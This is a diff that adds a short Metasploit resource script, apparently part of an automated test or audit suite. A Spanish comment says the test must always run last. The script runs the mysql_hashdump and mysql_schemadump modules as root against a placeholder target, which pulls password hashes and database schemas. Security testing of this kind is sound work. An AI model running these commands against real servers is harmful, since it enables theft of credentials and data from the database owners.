@@ -1,0 +1,12 @@
+use auxiliary/scanner/mysql/mysql_hashdump
+set RHOSTS _IP_TARGET_
+set USERNAME root
+exploit
+
+# este test siempre tiene que ser el ultimo test en ejecutarse
+use auxiliary/scanner/mysql/mysql_schemadump
+set RHOSTS _IP_TARGET_
+set USERNAME root
+exploit
+
+exit
